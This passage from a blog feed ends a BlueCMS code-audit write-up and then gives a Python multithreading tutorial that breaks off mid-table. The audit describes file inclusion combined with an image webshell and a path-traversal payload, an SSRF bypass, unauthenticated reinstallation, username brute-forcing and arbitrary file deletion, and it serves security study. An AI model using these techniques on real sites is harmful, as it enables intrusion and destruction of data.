id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>既然有文件包含漏洞自然少不了那四个<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">文件包含</a>的操作，所以在找文件包含漏洞的时候就需要对这几个操作格外留意</p><h4 id="支付表单文件包含"><a href="#支付表单文件包含" class="headerlink" title="支付表单文件包含"></a>支付表单文件包含</h4><p>先在user.php中找到有<code>include</code>操作的代码，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt=""></p><p>可以看到这里我们可以post一个pay参数，且pay参数我们可控，既然有文件包含了，自然就要找到文件上传的地方来包含这个文件来达到getshell的目的，在我们修改个人资料的界面就有上传头像的操作，于是我们上传图片马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt=""></p><p>得到路径，而这个文件包含操作在后面还加上了一个<code>/index.php</code>，这里就要根据为Windows下的文件最大路径来截取了，前提条件是php版本要小于<code>5.2.8</code>，Windows下目录最大长度为256字节，超出的部分会被丢弃，于是在提交act=pay的表单处提交一个<code>pay=../../data/upload/face_pic/15869440930.jpg......(超出256个字节)</code>，即可达到效果，由于我这没配php5.2.8的版本就不演示了</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="修改用户头像处SSRF"><a href="#修改用户头像处SSRF" class="headerlink" title="修改用户头像处SSRF"></a>修改用户头像处SSRF</h4><p>源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt=""></p><p>这段代码是用来防止<code>http://</code>和<code>https://</code>链接的，但是使用的是弱比价，如果<code>strpos</code>返回的值为0，那么<code>0!=false</code>返回的是<code>false</code>即可绕过判断访问内网资源</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="install无限安装"><a href="#install无限安装" class="headerlink" title="install无限安装"></a>install无限安装</h4><p>install目录是用来安装这个CMS的，但是在经过一次安装后再进入install系统并不会提示已经安装过或者要身份验证，于是就会造成无需任何提交就可以重新安装这个网站的风险，尽管管理员页面有提示（开发人员也有意识到），但如果使用者并没有在意就会造成极大的危害</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt=""></p><h4 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h4><p>在输入用户名之后系统会自动发一个包到数据库去验证，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt=""></p><p>而这个查询并没有次数限制，于是就可以利用这个数据包传入的user_name值来爆破用户名，造成身份信息泄露</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt=""></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在修改会员的个人资料页面存在此漏洞，源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt=""></p><p><code>face_pic3</code>可控，当<code>face_pic1</code>为空时即可删除<code>face_pic3</code>文件，如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt=""></p><p>可删除网站根目录下的1.txt文件</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/7074" target="_blank" rel="noopener">https://xz.aliyun.com/t/7074</a></li><li><a href="https://www.anquanke.com/post/id/178545" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178545</a></li><li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699" target="_blank" rel="noopener">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 源码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMS </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-多线程编程</title>
      <link href="/2020/04/10/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/04/10/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>可用对象列表</p><table><thead><tr><th align="center">对象</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Thread</td><td align="center">表示一个执行线程的对象</td></tr><tr><td align="center">Lock</td><td align="center">锁原语对象</td></tr><tr><td align="center">RLock</td><td align="center">可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)</td></tr><tr><td align="center">Condition</td><td align="center">条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值</td></tr><tr><td align="center">Event</td><td align="center">条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活</td></tr><tr><td align="center">Semaphore</td><td align="center">为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞</td></tr><tr><td align="center">BoundedSemaphore</td><td align="center">与Semaphore相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Timer</td><td align="center">与Thread相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Barrier</td><td align="center">创建一个”障碍”，必须达到指定数量的线程后才可以继续</td></tr></tbody></table><h3 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h3><p>Thread类是threading模块主要的执行对象</p><p><strong>Thread对象数据属性</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">线程名</td></tr><tr><td align="center">ident</td><td align="center">线程的标识符</td></tr><tr><td align="center">daemon</td><td align="center">布尔标志，表示这个线程是否是守护线程</td></tr></tbody></table><p><strong>Thread对象方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs={},verbose=None,daemon=None)</code></td><td align="center">实例化一个线程对象，需要有一个可调用的target，以及其参数args或kwargs</td></tr><tr><td align="center">start()</td><td align="center">开始执行该线程</td></tr><tr><td align="center">run()</td><td align="center">定义线程功能的方法(通常在子类中被应用开发者重写)</td></tr><tr><td align="center">join(timeout=None)</td><td align="center">直至启动的线程终止之前一直挂起；除非给出了timeout(秒)，否则会一直阻塞</td></tr></tbody></table><p>下面看一段可创建多线程的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep, ctime</span><br><span class="line">loops = [<span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop</span><span class="params">(nloop, nsec)</span>:</span></span><br><span class="line">    print(<span class="string">"start loop"</span>, nloop, <span class="string">"at :"</span>, ctime())</span><br><span class="line">    sleep(nsec)</span><br><span class="line">    print(<span class="string">"loop"</span>, nloop, <span class="string">"done at :"</span>, ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"starting at:"</span>, ctime())</span><br><span class="line">    threads = []</span><br><span class="line">    nloops = range(len(loops))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nloops:</span><br><span class="line">        t = threading.Thread(target=loop, args=(i,loops[i]))  <span class="comment">#target=需要线程去执行的方法名   args=线程执行方法接收的参数，该属性是一个元组，如果只有一个参数也需要在末尾加逗号</span></span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nloops:</span><br><span class="line">        print(threads[i])</span><br><span class="line">        threads[i].start() <span class="comment">#线程等待启动</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nloops:</span><br><span class="line">        threads[i].join()  <span class="comment"># 线程等待，主线程不会等待子线程执行完毕再结束自身，可使用Thread类的join()方法来让所有子线程执行完毕以后，主线程再关闭</span></span><br><span class="line">        print(threads[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"all DONE at:"</span>,ctime())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt=""></p><p>当然以上也可以创建多个线程，下面使用可调用的类来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime, sleep</span><br><span class="line"></span><br><span class="line">loops = [<span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadFunc</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func, args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.func = func</span><br><span class="line">        self.args = args</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>          <span class="comment">#重写run方法,定义线程功能</span></span><br><span class="line">        self.func(*self.args)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop</span><span class="params">(nloop, nsec)</span>:</span></span><br><span class="line">    print(<span class="string">'start loop'</span>, nloop, <span class="string">'at :'</span>, ctime())</span><br><span class="line">    sleep(nsec)</span><br><span class="line">    print(<span class="string">'loop'</span>, nloop, <span class="string">'done at :'</span>, ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'starting at :'</span>, ctime())</span><br><span class="line">    threads = []</span><br><span class="line">    nloops = range(len(loops))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nloops:</span><br><span class="line">        t = ThreadFunc(loop, (i, loops[i]))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nloops:</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nloops:</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'all DONE at :'</span>,ctime())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果和上面的一样，随后我们将其功能存储为一个独立的模块（myThread.py）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,func,args,name = <span class="string">""</span>)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.func = func</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.res  <span class="comment">#将结果保存后通过getResult方法获取返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"starting"</span>, self.name, ctime())</span><br><span class="line">        self.res = self.func(*self.args)</span><br><span class="line">        print(self.name, <span class="string">"finished at :"</span>, ctime())</span><br></pre></td></tr></table></figure><h3 id="斐波那契，阶乘与累加"><a href="#斐波那契，阶乘与累加" class="headerlink" title="斐波那契，阶乘与累加"></a>斐波那契，阶乘与累加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> myThread <span class="keyword">import</span> MyThread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime, sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fib</span><span class="params">(x)</span>:</span></span><br><span class="line">    sleep(<span class="number">0.005</span>)</span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">3</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (Fib(x - <span class="number">1</span>) + Fib(x - <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fac</span><span class="params">(x)</span>:</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">2</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (x * Fac(x - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sum</span><span class="params">(x)</span>:</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">2</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (x + Sum(x - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">funcs = [Fib, Fac, Sum]</span><br><span class="line">n = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    nfuncs = range(len(funcs))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        print(<span class="string">"starting"</span>, funcs[i].__name__, <span class="string">"at :"</span>, ctime())</span><br><span class="line">        print(funcs[i](n))</span><br><span class="line">        print(funcs[i].__name__, <span class="string">"finished at :"</span>, ctime())</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"\n *** MULTIPLE THREADS"</span>)</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        t = MyThread(funcs[i], (n,), funcs[i].__name__)</span><br><span class="line">        threads.append(t)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        threads[i].start()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        threads[i].join()</span><br><span class="line">        print(threads[i].getResult())</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"all DONE"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果如下，可见多线程处理的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt=""></p><h3 id="锁示例"><a href="#锁示例" class="headerlink" title="锁示例"></a>锁示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> atexit <span class="keyword">import</span> register</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread , Lock, current_thread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime, sleep</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CleanOutputSet</span><span class="params">(set)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span>  <span class="comment">#当使用print输出对象的时候，若定义了__str__(self)方法，打印对象时就会从这个方法中打印出return的字符串数据</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">", "</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span> self)<span class="comment">#表示将self中每个元素（除最后一个）后加上, 分离形成字符串后返回</span></span><br><span class="line"></span><br><span class="line">lock = Lock()   <span class="comment">#创建一个锁对象</span></span><br><span class="line">loops = (randrange(<span class="number">2</span>,<span class="number">5</span>) <span class="keyword">for</span> x <span class="keyword">in</span> range(randrange(<span class="number">3</span>,<span class="number">7</span>)))<span class="comment">#此行表示随机选取2-5的数字随机选3-7次</span></span><br><span class="line">remaining = CleanOutputSet()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop</span><span class="params">(nsec)</span>:</span></span><br><span class="line">    myname = current_thread().name  <span class="comment">#返回当前Thread对象的名字</span></span><br><span class="line">    lock.acquire()          <span class="comment">#加锁</span></span><br><span class="line">    remaining.add(myname)   <span class="comment">#add方法，如果不在集合中则添加</span></span><br><span class="line">    print(<span class="string">"[&#123;&#125;] Started &#123;&#125;"</span>.format(ctime(),myname))</span><br><span class="line">    <span class="comment">#print("    (remaining: &#123;&#125;)".format(remaining or "NONE"))</span></span><br><span class="line">    lock.release()          <span class="comment">#释放</span></span><br><span class="line">    sleep(nsec)</span><br><span class="line">    lock.acquire()</span><br><span class="line">    remaining.remove(myname)</span><br><span class="line">    print(<span class="string">"[&#123;&#125;] Competed &#123;&#125; (&#123;&#125; secs)"</span>.format(ctime(),myname,nsec))</span><br><span class="line">    print(<span class="string">"    (remaining: &#123;&#125;)"</span>.format(remaining <span class="keyword">or</span> <span class="string">"NONE"</span>))</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> pause <span class="keyword">in</span> loops:</span><br><span class="line">        Thread(target=loop, args=(pause,)).start()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register   #通过装饰器使用register,atexit模块使用register函数用于在 python 解释器中注册一个退出函数，这个函数在解释器正常终止时自动执行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_atexit</span><span class="params">()</span>:</span> </span><br><span class="line">    print(<span class="string">"all DONE at :&#123;&#125;"</span>.format(ctime()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>输出结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt=""></p><p>I/O和访问相同的数据结构都属于临界区，因此需要多个锁来防止多个线程同时进入临界区</p><h3 id="信号量示例"><a href="#信号量示例" class="headerlink" title="信号量示例"></a>信号量示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> atexit <span class="keyword">import</span> register</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> BoundedSemaphore, Lock, Thread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime, sleep</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line">MAX = <span class="number">5</span></span><br><span class="line">candytray = BoundedSemaphore(MAX)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refill</span><span class="params">()</span>:</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    print(<span class="string">"Refilling candy..."</span>,end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        candytray.release()  <span class="comment">#释放信号量，使内部计数器增加一，可以唤醒等待的线程</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        print(<span class="string">"full, skipping"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"OK  "</span>,end=<span class="string">""</span>)</span><br><span class="line">        print(<span class="string">"Remaining :&#123;&#125;"</span>.format(candytray._value))</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">()</span>:</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    print(<span class="string">"Buying candy..."</span>,end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> candytray.acquire(<span class="literal">False</span>):   <span class="comment"># 获取一个信号量，如果内部计数器大于零，则将其减一并立即返回True。如果为零，返回False</span></span><br><span class="line">        print(<span class="string">"OK  "</span>,end=<span class="string">""</span>)</span><br><span class="line">        print(<span class="string">"Remaining :&#123;&#125;"</span>.format(candytray._value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"empty, skipping"</span>)</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">producer</span><span class="params">(loops)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(loops):</span><br><span class="line">        refill()</span><br><span class="line">        sleep(randrange(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consumer</span><span class="params">(loops)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(loops):</span><br><span class="line">        buy()</span><br><span class="line">        sleep(randrange(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"starting at :&#123;&#125;"</span>.format(ctime()))</span><br><span class="line">    nloops = randrange(<span class="number">2</span>,<span class="number">6</span>)</span><br><span class="line">    print(<span class="string">"THE CANDY MACHINE (full with &#123;&#125;)!"</span>.format(MAX))</span><br><span class="line">    Thread(target=consumer, args=(randrange(nloops, nloops + MAX + <span class="number">2</span>),)).start()</span><br><span class="line">    Thread(target=producer, args=(nloops,)).start()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_atexit</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"all DONE at :&#123;&#125;"</span>.format(ctime()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>acquire(blocking=布尔值,timeout=None)</code></p><ul><li>本方法用于获得Semaphore</li><li>blocking默认值是True，此时，如果内部计数器值大于0，则减一，并返回；如果等于0，则阻塞，等待其他线程调用release()以使计数器加1；本方法返回True，或无线阻塞</li><li>如果blocking=False,则不阻塞，如若获取失败，则返回False</li><li>当设定了timeout的值，最多阻塞timeout秒，如果超时，返回False。</li></ul><p><code>release()</code></p><ul><li>释放Semaphore，内部计数器加1，可以唤醒等待的线程</li></ul><p>结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt=""></p><h3 id="生产者，消费者-多线程"><a href="#生产者，消费者-多线程" class="headerlink" title="生产者，消费者(多线程)"></a>生产者，消费者(多线程)</h3><p><strong>queue模块</strong></p><p><strong>类</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Queue(maxsize=0)</td><td align="center">创建一个先入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">LifoQueue(maxsize=0)</td><td 